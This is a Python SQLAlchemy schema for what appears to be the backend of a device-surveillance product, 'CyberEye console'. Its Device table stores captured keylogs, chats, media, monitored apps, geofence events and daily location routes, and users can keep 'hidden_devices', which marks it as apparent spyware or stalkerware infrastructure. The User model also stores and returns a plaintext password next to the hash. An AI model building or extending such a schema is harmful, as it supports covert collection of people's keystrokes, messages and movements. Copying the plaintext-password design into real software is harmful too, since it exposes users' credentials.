import time
from datetime import datetime
from sqlalchemy import (
    Column, String, Text, Boolean, BigInteger, DateTime,
    ForeignKey, JSON
)
from sqlalchemy.orm import declarative_base, relationship

Base = declarative_base()

class User(Base):
    __tablename__ = 'users'

    username = Column(String(128), primary_key=True)
    password_hash = Column(String(256), nullable=False)
    plain_password = Column(String(256), nullable=True)
    role = Column(String(32), default='user')
    devices = Column(JSON, default=list)
    hidden_devices = Column(JSON, default=list)
    last_seen = Column(BigInteger, default=0)
    created_at = Column(DateTime, default=datetime.utcnow)

    licenses = relationship("License", back_populates="user", cascade="all, delete-orphan")

    def to_dict(self):
        return {
            "password_hash": self.password_hash,
            "plain_password": self.plain_password or "",
            "role": self.role or "user",
            "devices": self.devices or [],
            "hidden_devices": self.hidden_devices or [],
            "last_seen": self.last_seen or 0
        }

class License(Base):
    __tablename__ = 'licenses'

    license_key = Column(String(64), primary_key=True)
    assigned_to = Column(String(128), ForeignKey('users.username', ondelete='SET NULL'), nullable=True)
    expires_at = Column(BigInteger, nullable=False)
    is_active = Column(Boolean, default=True)
    created_at = Column(BigInteger, default=lambda: int(time.time()))

    user = relationship("User", back_populates="licenses")

    def to_dict(self):
        return {
            "assigned_to": self.assigned_to,
            "expires_at": self.expires_at,
            "is_active": self.is_active,
            "created_at": self.created_at
        }

class Device(Base):
    __tablename__ = 'devices'

    device_id = Column(String(64), primary_key=True)
    license_key = Column(String(64), nullable=True)
    info = Column(Text, default="")
    logs = Column(JSON, default=list)
    refs = Column(JSON, default=dict)
    last_seen = Column(BigInteger, default=0)
    settings = Column(JSON, default=lambda: {
        "lock_track_enabled": False,
        "monitored_apps": {},
        "geofences": []
    })
    last_geofence_states = Column(JSON, default=dict)
    geofence_events = Column(JSON, default=list)
    today_route = Column(JSON, default=list)
    today_route_date = Column(String(32), default="")
    route_history = Column(JSON, default=list)
    keylogs = Column(JSON, default=dict)
    chats = Column(JSON, default=dict)
    media = Column(JSON, default=dict)
    extra_data = Column(JSON, default=dict)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def to_dict(self):
        d = {
            "_id": self.device_id,
            "license_key": self.license_key,
            "info": self.info or "",
            "logs": self.logs or [],
            "refs": self.refs or {},
            "lastSeen": self.last_seen or 0,
            "settings": self.settings or {"lock_track_enabled": False, "monitored_apps": {}, "geofences": []},
            "last_geofence_states": self.last_geofence_states or {},
            "geofence_events": self.geofence_events or [],
            "today_route": self.today_route or [],
            "today_route_date": self.today_route_date or "",
            "route_history": self.route_history or [],
            "keylogs": self.keylogs or {},
            "chats": self.chats or {},
            "media": self.media or {}
        }
        if self.extra_data and isinstance(self.extra_data, dict):
            d.update(self.extra_data)
        return d

class Report(Base):
    __tablename__ = 'reports'

    id = Column(String(64), primary_key=True)
    username = Column(String(128), nullable=True)
    license_key = Column(String(64), nullable=True)
    issue_text = Column(Text, nullable=False)
    timestamp = Column(BigInteger, nullable=False)
    status = Column(String(32), default='pending')

    def to_dict(self):
        return {
            "id": self.id,
            "username": self.username,
            "license_key": self.license_key,
            "issue_text": self.issue_text,
            "timestamp": self.timestamp,
            "status": self.status
        }

class SystemPolicy(Base):
    __tablename__ = 'system_policies'

    key = Column(String(64), primary_key=True, default='main')
    maintenance_mode = Column(Boolean, default=False)
    maintenance_message = Column(Text, default="Scheduled updates are in progress. CyberEye console will be back online shortly.")
    maintenance_until = Column(BigInteger, default=0)

    def to_dict(self):
        return {
            "maintenance_mode": self.maintenance_mode,
            "maintenance_message": self.maintenance_message,
            "maintenance_until": self.maintenance_until
        }

def init_db(engine):
    """Creates all relational database tables if they do not already exist."""
    Base.metadata.create_all(bind=engine)
